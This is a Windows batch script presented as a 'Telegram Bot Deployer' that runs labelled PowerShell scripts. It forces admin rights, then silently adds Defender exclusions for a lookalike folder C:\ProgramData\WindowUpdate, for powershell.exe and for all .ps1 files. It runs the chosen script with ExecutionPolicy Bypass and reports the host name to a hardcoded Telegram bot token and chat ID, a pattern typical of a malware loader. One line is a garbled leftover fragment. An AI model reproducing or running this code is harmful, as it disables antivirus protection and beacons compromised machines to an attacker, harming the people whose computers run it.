@echo off
title Telegram Bot Deployer
color 0A

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

setlocal enabledelayedexpansion
set "SCRIPT_DIR=%~dp0"

echo ========================================
echo    TELEGRAM BOT DEPLOYER
echo ========================================
echo.

powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\WindowUpdate' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.ps1' -ErrorAction SilentlyContinue"

echo [INFO] Defender exclusions added.
echo.
echo [INFO] Scanning for deployment scripts...
echo.

set "TOTAL=0"

:: ========================================
:: TEDI (GREEN)
:: ========================================
echo.
powershell -Command "Write-Host '==================' -ForegroundColor Green"
powershell -Command "Write-Host 'TEDI LABS' -ForegroundColor Green"
powershell -Command "Write-Host '==================' -ForegroundColor Green"

if exist "%SCRIPT_DIR%M01.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=M01.ps1" & set "LBL_!TOTAL!=Tedi Lab 1" & powershell -Command "Write-Host '  [!TOTAL!] Tedi Lab 1 (M01.ps1)' -ForegroundColor Green")
if exist "%SCRIPT_DIR%M02.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=M02.ps1" & set "LBL_!TOTAL!=Tedi Lab 2" & powershell -Command "Write-Host '  [!TOTAL!] Tedi Lab 2 (M02.ps1)' -ForegroundColor Green")
if exist "%SCRIPT_DIR%M03.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=M03.ps1" & set "LBL_!TOTAL!=Tedi Lab 3" & powershell -Command "Write-Host '  [!TOTAL!] Tedi Lab 3 (M03.ps1)' -ForegroundColor Green")
if exist "%SCRIPT_DIR%M04.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=M04.ps1" & set "LBL_!TOTAL!=Tedi Lab 4" & powershell -Command "Write-Host '  [!TOTAL!] Tedi Lab 4 (M04.ps1)' -ForegroundColor Green")
if exist "%SCRIPT_DIR%V01.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=V01.ps1" & set "LBL_!TOTAL!=Veterinary" & powershell -Command "Write-Host '  [!TOTAL!] Veterinary (V01.ps1)' -ForegroundColor Green")

:: ========================================
:: FASIL (BLUE)
:: ========================================
echo.
powershell -Command "Write-Host '==================' -ForegroundColor Blue"
powershell -Command "Write-Host 'FASIL LABS' -ForegroundColor Blue"
powershell -Command "Write-Host '==================' -ForegroundColor Blue"

if exist "%SCRIPT_DIR%F01.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=F01.ps1" & set "LBL_!TOTAL!=Fasil Lab 1" & powershell -Command "Write-Host '  [!TOTAL!] Fasil Lab 1 (F01.ps1)' -ForegroundColor Blue")
if exist "%SCRIPT_DIR%F02.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=F02.ps1" & set "LBL_!TOTAL!=Fasil Lab 2" & powershell -Command "Write-Host '  [!TOTAL!] Fasil Lab 2 (F02.ps1)' -ForegroundColor Blue")
if exist "%SCRIPT_DIR%F03.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=F03.ps1" & set "LBL_!TOTAL!=Fasil Lab 3" & powershell -Command "Write-Host '  [!TOTAL!] Fasil Lab 3 (F03.ps1)' -ForegroundColor Blue")
if exist "%SCRIPT_DIR%F04.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=F04.ps1" & set "LBL_!TOTAL!=Fasil Lab 4" & powershell -Command "Write-Host '  [!TOTAL!] Fasil Lab 4 (F04.ps1)' -ForegroundColor Blue")
if exist "%SCRIPT_DIR%F05.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=F05.ps1" & set "LBL_!TOTAL!=Fasil Lab 5" & powershell -Command "Write-Host '  [!TOTAL!] Fasil Lab 5 (F05.ps1)' -ForegroundColor Blue")
if exist "%SCRIPT_DIR%F06.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=F06.ps1" & set "LBL_!TOTAL!=Fasil Lab 6" & powershell -Command "Write-Host '  [!TOTAL!] Fasil Lab 6 (F06.ps1)' -ForegroundColor Blue")

:: ========================================
:: MARAKI (RED)
:: ========================================
echo.
powershell -Command "Write-Host '==================' -ForegroundColor Red"
powershell -Command "Write-Host 'MARAKI LABS' -ForegroundColor Red"
powershell -Command "Write-Host '==================' -ForegroundColor Red"

if exist "%SCRIPT_DIR%FB01.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=FB01.ps1" & set "LBL_!TOTAL!=Maraki FB" & powershell -Command "Write-Host '  [!TOTAL!] Maraki FB (FB01.ps1)' -ForegroundColor Red")
if exist "%SCRIPT_DIR%MA01.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=MA01.ps1" & set "LBL_!TOTAL!=Maraki Lab 1" & powershell -Command "Write-Host '  [!TOTAL!] Maraki Lab 1 (MA01.ps1)' -ForegroundColor Red")
if exist "%SCRIPT_DIR%MA02.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=MA02.ps1" & set "LBL_!TOTAL!=Maraki Lab 2" & powershell -Command "Write-Host '  [!TOTAL!] Maraki Lab 2 (MA02.ps1)' -ForegroundColor Red")
if exist "%SCRIPT_DIR%MA03.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=MA03.ps1" & set "LBL_!TOTAL!=Maraki Lab 3" & powershell -Command "Write-Host '  [!TOTAL!] Maraki Lab 3 (MA03.ps1)' -ForegroundColor Red")
if exist "%SCRIPT_DIR%MA04.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=MA04.ps1" & set "LBL_!TOTAL!=Maraki Lab 4" & powershell -Command "Write-Host '  [!TOTAL!] Maraki Lab 4 (MA04.ps1)' -ForegroundColor Red")
TOTAL!] Maraki Lab 3 (MA03.ps1)' -ForegroundColor Red")
if exist "%SCRIPT_DIR%FB.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=FB.ps1" & set "LBL_!TOTAL!=Maraki FB" & powershell -Command "Write-Host '  [!TOTAL!] Maraki FB (FB.ps1)' -ForegroundColor Red")
echo.
echo ========================================

if %TOTAL% equ 0 (
    echo.
    echo [ERROR] No deployment scripts found!
    echo.
    echo Please make sure at least one script exists:
    echo.
    echo   TEDI:    M01.ps1, M02.ps1, M03.ps1, M04.ps1, V01.ps1
    echo   FASIL:   F01.ps1, F02.ps1, F03.ps1, F04.ps1, F05.ps1, F06.ps1
    echo   MARAKI:  FB01.ps1, MA01.ps1, MA02.ps1, MA03.ps1, MA04.ps1
    echo.
    pause
    exit /b 1
)

echo.
set /p CHOICE="Enter your choice (1-%TOTAL%): "

if "%CHOICE%" lss "1" goto :invalid
if "%CHOICE%" gtr "%TOTAL%" goto :invalid

for %%i in (%CHOICE%) do (
    set "SELECTED=!OPT_%%i!"
    set "LABEL=!LBL_%%i!"
)

set "FOUND_SCRIPT=%SCRIPT_DIR%!SELECTED!"
echo.
echo [INFO] Selected: !LABEL! (!SELECTED!)
echo [INFO] Deploying...
echo.

powershell -NoProfile -ExecutionPolicy Bypass -File "%FOUND_SCRIPT%"

if %errorlevel% equ 0 (
    echo.
    echo ========================================
    powershell -Command "Write-Host '   DEPLOYMENT SUCCESSFUL!' -ForegroundColor Green"
    echo ========================================
    echo.
    echo [INFO] Deployed on host: %COMPUTERNAME%
    echo.
    powershell -Command "$token = '8425297013:AAG42OM97dT64vT9V4CVkiF-0n9nCqP8BSI'; $chat = '7303070402'; $msg = \"Deployment Successful!`n`nScript: !SELECTED!`nHost: %COMPUTERNAME%\"; $uri = 'https://api.telegram.org/bot' + $token + '/sendMessage'; Invoke-RestMethod -Uri $uri -Method Post -Body @{chat_id=$chat; text=$msg}"
    echo [INFO] Telegram notification sent.
    echo.
) else (
    echo.
    echo ========================================
    powershell -Command "Write-Host '   DEPLOYMENT FAILED!' -ForegroundColor Red"
    echo ========================================
)